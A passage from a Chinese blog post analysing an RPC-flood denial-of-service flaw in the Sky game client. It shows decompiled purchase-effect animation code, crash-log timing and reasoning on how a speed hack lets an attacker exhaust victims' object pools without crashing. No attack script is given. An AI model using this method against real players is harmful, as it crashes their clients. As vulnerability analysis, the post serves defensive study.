+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      a1 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> __PAIR128__</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(v255, v54.n128_u64[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">]);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    else</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    {</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v269 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (progress </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#D73A49;--shiki-dark:#F97583"> -</span><span style="color:#005CC5;--shiki-dark:#79B8FF">0.6</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">/</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.2</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v270 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> clamp01</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v269);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v267 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 2.5</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v266 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v268 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> lerp</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v267, a2: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v266, a3: progress);</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      *&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v50 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">      sub_1B29D38</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: v264.n128_u64, result: v50, a3: v268, a4: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">0.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v51 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> sub_2219E18</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v288, a2: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v264);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v265.n128_u32[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">] </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v51.n128_u32[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v265.n128_u64[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">] </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v51.n128_u64[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v52 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> sub_2219ED4</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v265, a2: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v287, a3: v270);</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">      LODWORD</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(v263) </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v52.n128_u32[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v262 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v52.n128_u64[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      a1 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> __PAIR128__</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(v263, v52.n128_u64[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">]);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    v252 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ((</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sinf</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(x: (v324 </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 10.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (v273 </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 17.3</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)) </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.5</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.5</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.85</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    v55 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> sinf</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(x: (v324 </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 27.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (v273 </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 35.7</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">));</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    v252 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v252 </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (((v55 </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.5</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.5</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.15</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( item->model </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> nullptr ) ...</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( item->lensFlare </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> nullptr ) ...</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( item->wingBuffFx </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> nullptr ) ...</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( j </span><span style="color:#D73A49;--shiki-dark:#F97583">==</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#D73A49;--shiki-dark:#F97583"> &#x26;&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> progress </span><span style="color:#D73A49;--shiki-dark:#F97583">></span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.85</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v291 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> true</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( progress </span><span style="color:#D73A49;--shiki-dark:#F97583">></span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.95</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    {</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v230 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( item->model </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> nullptr ) ...</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( item->lensFlare </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> nullptr ) ...</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( item->wingBuffFx </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> nullptr )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      {</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">        WingBuffBarn::ReleaseWingBuffVisual</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(barn: p_game->wingBuffBarn, fx: item->wingBuffFx, game: p_game);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        item->wingBuffFx </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> nullptr;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( (v326 </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#D73A49;--shiki-dark:#F97583"> &#x26;&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> sourceAvatar </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> nullptr </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sub_2219FC0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: sourceAvatar->account) </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ) ...</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v230 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      }</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( (v230 </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ) ...</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  }</span></span>
+<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D">  // ...</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">}</span></span></code></pre><span class="language ps-1 pe-3 text-sm bg-muted text-muted-foreground">c</span><button class="copy text-muted-foreground p-1 box-content border rounded-lg bg-card" aria-label="Copy code" data-code="float __fastcall clamp01(float *a1)
+{
+  return fminf(fmaxf(*a1, 0.0), 1.0);
+}
+float __fastcall lerp(float *a1, float *a2, float a3)
+{
+  return *a1 + ((*a2 - *a1) * a3);
+}
+void __fastcall PurchaseFx::Update(PurchaseFx *fx, Game *game)
+{
+  // ...
+  for ( j = 0; j < fx->itemCount; ++j )
+  {
+    item = &#x26;fx->items[j];
+    v290[fx->items[j].value] = 1;
+    *&#x26;a2 = 0u;
+    sub_22192DC(&#x26;a1, &#x26;a2);
+    v273 = j / fx->itemCount;
+    v271 = (fx->elapsed / 4.0) - (v273 * 0.3f);
+    progress = clamp01(a1: &#x26;v271);
+    if ( j != 0 ) // 光翼的动画只有一个item，所以这里的分支走else，实际上实在计算光效位置，可以忽略
+    {
+      v260 = (progress + -0.9f) / 0.1f;
+      v261 = 0.2f - (clamp01(a1: &#x26;v260) * 0.2f);
+      x = (fx->elapsed * 3.0) + (v273 * 57.0);
+      v257 = 2.5;
+      v256 = 0.25;
+      v258 = lerp(a1: &#x26;v257, a2: &#x26;v256, a3: progress);
+      sincosf(x, &#x26;sinx, &#x26;cosx); // 多个item时动画效果是绕圈下落的
+      *&#x26;v53 = cosx * v261;
+      sub_1B29D38(a1: v253.n128_u64, result: v53, a3: v258, a4: sinx * v261);
+      v54 = sub_2219E18(a1: &#x26;v288, a2: &#x26;v253);
+      LODWORD(v255) = v54.n128_u32[2];
+      v254 = v54.n128_u64[0];
+      a1 = __PAIR128__(v255, v54.n128_u64[0]);
+    }
+    else
+    {
+      v269 = (progress + -0.6f) / 0.2f;
+      v270 = clamp01(a1: &#x26;v269);
+      v267 = 2.5;
+      v266 = 0;
+      v268 = lerp(a1: &#x26;v267, a2: &#x26;v266, a3: progress);
+      *&#x26;v50 = 0;
+      sub_1B29D38(a1: v264.n128_u64, result: v50, a3: v268, a4: 0.0);
+      v51 = sub_2219E18(a1: &#x26;v288, a2: &#x26;v264);
+      v265.n128_u32[2] = v51.n128_u32[2];
+      v265.n128_u64[0] = v51.n128_u64[0];
+      v52 = sub_2219ED4(a1: &#x26;v265, a2: &#x26;v287, a3: v270);
+      LODWORD(v263) = v52.n128_u32[2];
+      v262 = v52.n128_u64[0];
+      a1 = __PAIR128__(v263, v52.n128_u64[0]);
+    }
+    v252 = ((sinf(x: (v324 * 10.0) + (v273 * 17.3f)) * 0.5) + 0.5) * 0.85f;
+    v55 = sinf(x: (v324 * 27.0) + (v273 * 35.7f));
+    v252 = v252 + (((v55 * 0.5) + 0.5) * 0.15f);
+    if ( item->model != nullptr ) ...
+    if ( item->lensFlare != nullptr ) ...
+    if ( item->wingBuffFx != nullptr ) ...
+    if ( j == 0 &#x26;&#x26; progress > 0.85f )
+      v291 = true;
+    if ( progress > 0.95f )
+    {
+      v230 = 0;
+      if ( item->model != nullptr ) ...
+      if ( item->lensFlare != nullptr ) ...
+      if ( item->wingBuffFx != nullptr )
+      {
+        WingBuffBarn::ReleaseWingBuffVisual(barn: p_game->wingBuffBarn, fx: item->wingBuffFx, game: p_game);
+        item->wingBuffFx = nullptr;
+        if ( (v326 &#x26; 1) != 0 &#x26;&#x26; sourceAvatar != nullptr &#x26;&#x26; (sub_2219FC0(a1: sourceAvatar->account) &#x26; 1) != 0 ) ...
+        v230 = 1;
+      }
+      if ( (v230 &#x26; 1) != 0 ) ...
+    }
+  }
+  // ...
+}" onclick="
+          navigator.clipboard.writeText(this.dataset.code);
+          this.classList.add(&#x27;copied&#x27;);
+          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)
+        "><div class="ready"><svg class="size-5"><use href="/icons/code.svg#mingcute-clipboard-line"></use></svg></div><div class="success hidden"><svg class="size-5"><use href="/icons/code.svg#mingcute-file-check-line"></use></svg></div></button><button class="collapse-toggle bg-card text-muted-foreground rounded-lg m-2" aria-label="Toggle collapse code block" onclick="this.parentElement.classList.toggle(&#x27;collapsed&#x27;)"><svg class="size-5"><use href="/icons/code.svg#mingcute-arrow-down-line"></use></svg><span class="desc"> code</span></button><div class="collapse-fade"></div></div>
+<p>所以我们可以推测一下，既然接收端是没有限速的，那么攻击者只要在<code>3.8s</code>这个窗口内尽可能多的发送RPC即可。回到崩溃日志，查看<code>Invalid PurchaseFxItem3D configuration</code>数量按时间分一下组，数据刚好对上我的测试数据，只花了大概 1.12 秒就资源耗尽了</p>
+<div class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><pre><code><span class="line"><span>xx:xx:xx.049-054   100 条</span></span>
+<span class="line"><span>xx:xx:xx.417-423   100 条</span></span>
+<span class="line"><span>xx:xx:xx.557-564   100 条</span></span>
+<span class="line"><span>xx:xx:xx.694-697   100 条</span></span>
+<span class="line"><span>xx:xx:xx.893-897   100 条</span></span>
+<span class="line"><span>xx:xx:xx.162-166    88 条</span></span></code></pre><span class="language ps-1 pe-3 text-sm bg-muted text-muted-foreground">plaintext</span><button class="copy text-muted-foreground p-1 box-content border rounded-lg bg-card" aria-label="Copy code" data-code="xx:xx:xx.049-054   100 条
+xx:xx:xx.417-423   100 条
+xx:xx:xx.557-564   100 条
+xx:xx:xx.694-697   100 条
+xx:xx:xx.893-897   100 条
+xx:xx:xx.162-166    88 条" onclick="
+          navigator.clipboard.writeText(this.dataset.code);
+          this.classList.add(&#x27;copied&#x27;);
+          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)
+        "><div class="ready"><svg class="size-5"><use href="/icons/code.svg#mingcute-clipboard-line"></use></svg></div><div class="success hidden"><svg class="size-5"><use href="/icons/code.svg#mingcute-file-check-line"></use></svg></div></button></div>
+<p>同时我们还注意到，攻击者在执行有效的攻击后自己本身并不会崩溃，这里推测是因为加速挂把游戏时钟也一起加快了。下面是AI分析的小结论，仅供参考</p>
+<p>假设加速 k 倍，不开加速时每秒产生 R 条</p>
+<ul>
+<li>攻击者这边：每秒产生 <code>k·R</code> 条；同时 <code>deltaTime</code> 也被放大，<code>elapsed</code> 走得快 <code>k</code> 倍，<code>3.8</code> 秒的归还窗口在真实时间里被压成 <code>3.8 / k</code> 秒。所以池子里同时占着的对象数是 <code>k·R × 3.8/k = 3.8·R</code>，和不开加速时一样。</li>
+<li>受害者这边：每秒收到 <code>k·R</code> 条，但游戏时钟是正常的，归还窗口还是 <code>3.8</code> 秒。同时占着的对象数是 <code>k·R × 3.8</code>，是攻击者的 <code>k</code> 倍。</li>
+</ul>     </div> </article> </main> <div class="bottom mt-6 items-start gap-x-10 md:flex astro-scuu7fyy">  <div class="flex-1 text-muted-foreground md:min-w-[50ch] astro-scuu7fyy"> <div class="relative flex flex-col gap-y-2 rounded-xl border px-3 sm:px-4 py-2 sm:py-3 astro-sjxyoaq4"> <svg aria-hidden="true" class="absolute end-4 top-4 size-20 opacity-10 astro-sjxyoaq4 astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none"><path d="m12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.018-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2m0 2a8 8 0 1 0 0 16a8 8 0 0 0 0-16m0 3a5 5 0 0 1 3.75 1.692a1 1 0 1 1-1.5 1.324a3 3 0 1 0 0 3.968a1 1 0 1 1 1.5 1.324A5 5 0 1 1 12 7"/></g></svg>  <div class="flex flex-col astro-sjxyoaq4"> <div class="font-medium text-foreground astro-sjxyoaq4">光遇客户端 RPC 洪泛拒绝服务漏洞分析</div> <div class="text-sm line-clamp-1 astro-sjxyoaq4">https://blog.yuro.work/blog/sky-client-dos-rpc-flood</div> </div>  <div class="flex flex-row flex-wrap justify-start gap-x-5 gap-y-1 sm:gap-x-8 astro-sjxyoaq4"> <div class="flex gap-x-2 sm:flex-col astro-sjxyoaq4"> <span class="astro-sjxyoaq4">Author</span> <span class="text-sm text-foreground max-sm:place-self-center astro-sjxyoaq4">yuro</span> </div> <div class="flex gap-x-2 sm:min-w-16 sm:flex-col astro-sjxyoaq4"> <span class="astro-sjxyoaq4">Published at</span> <span class="text-sm text-foreground max-sm:place-self-center astro-sjxyoaq4"> November 1, 2026 </span> </div> <div class="flex gap-x-2 sm:flex-col astro-sjxyoaq4"> <span class="astro-sjxyoaq4">Copyright</span> <a class="text-sm text-foreground max-sm:place-self-center astro-sjxyoaq4" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">
+CC BY-NC-SA 4.0
+</a> </div> </div>  <div class="relative astro-sjxyoaq4"> <div class="flex flex-row gap-3 astro-sjxyoaq4"> <button id="copy-link" aria-label="Copy link" class="group rounded-full bg-muted p-1 text-muted-foreground transition-colors hover:text-primary sm:p-1.5 astro-sjxyoaq4"> <svg aria-hidden="true" class="size-5 astro-sjxyoaq4 astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none"><path d="m12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.018-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M16.243 9.878a1 1 0 0 1 1.32-.083l.094.083L19.778 12a5.5 5.5 0 0 1-7.596 7.952L12 19.778l-2.121-2.121a1 1 0 0 1 1.32-1.498l.094.083l2.121 2.122a3.5 3.5 0 0 0 5.091-4.8l-.141-.15l-2.121-2.121a1 1 0 0 1 0-1.415M9.17 9.171a1 1 0 0 1 1.32-.083l.095.083l4.242 4.243a1 1 0 0 1-1.32 1.497l-.094-.083l-4.243-4.242a1 1 0 0 1 0-1.415m-4.95-4.95a5.5 5.5 0 0 1 7.597-.173l.182.174l2.121 2.12A1 1 0 0 1 12.8 7.84l-.094-.083l-2.121-2.121a3.5 3.5 0 0 0-5.091 4.8l.141.15l2.121 2.12a1 1 0 0 1-1.32 1.498l-.094-.083L4.222 12a5.5 5.5 0 0 1 0-7.778Z"/></g></svg> </button> <button id="get-qrcode" aria-label="Get QR code" class="group rounded-full bg-muted p-1 text-muted-foreground transition-colors hover:text-primary sm:p-1.5 astro-sjxyoaq4"> <svg aria-hidden="true" class="size-5 astro-sjxyoaq4 astro-hn7k2gay" width="22" height="22" viewBox="0 0 24 24" fill="currentColor" style="--sl-icon-size: 1em;"><g fill="none"><path d="m12.593 23.258l-.011.002l-.071.035l-.02.004l-.014-.004l-.071-.035q-.016-.005-.024.005l-.004.01l-.017.428l.005.02l.01.013l.104.074l.015.004l.012-.004l.104-.074l.012-.016l.004-.017l-.017-.427q-.004-.016-.017-.018m.265-.113l-.013.002l-.185.093l-.01.01l-.003.011l.018.43l.005.012l.008.007l.201.093q.019.005.029-.008l.004-.014l-.034-.614q-.005-.018-.02-.022m-.715.002a.02.02 0 0 0-.027.006l-.006.014l-.034.614q.001.018.017.024l.015-.002l.201-.093l.01-.008l.004-.011l.017-.43l-.003-.012l-.01-.01z"/><path fill="currentColor" d="M11 3a2 2 0 0 1 1.995 1.85L13 5v6a2 2 0 0 1-1.85 1.995L11 13H5a2 2 0 0 1-1.995-1.85L3 11V5a2 2 0 0 1 1.85-1.995L5 3zm0 2H5v6h6zM8.5 7a.5.5 0 0 1 .492.41L9 7.5v1a.5.5 0 0 1-.41.492L8.5 9h-1a.5.5 0 0 1-.492-.41L7 8.5v-1a.5.5 0 0 1 .41-.492L7.5 7zM21 5a2 2 0 0 0-2-2h-2a2 2 0 0 0-2 2v2a2 2 0 0 0 2 2h2a2 2 0 0 0 2-2zm-4 0h2v2h-2zM7 15a2 2 0 0 1 2 2v2a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-2a2 2 0 0 1 2-2zm0 2H5v2h2zm14 0a2 2 0 0 0-2-2h-2a2 2 0 0 0-2 2v2a2 2 0 0 0 2 2h2a2 2 0 0 0 2-2zm-4 0h2v2h-2zm-2-5a1 1 0 0 1 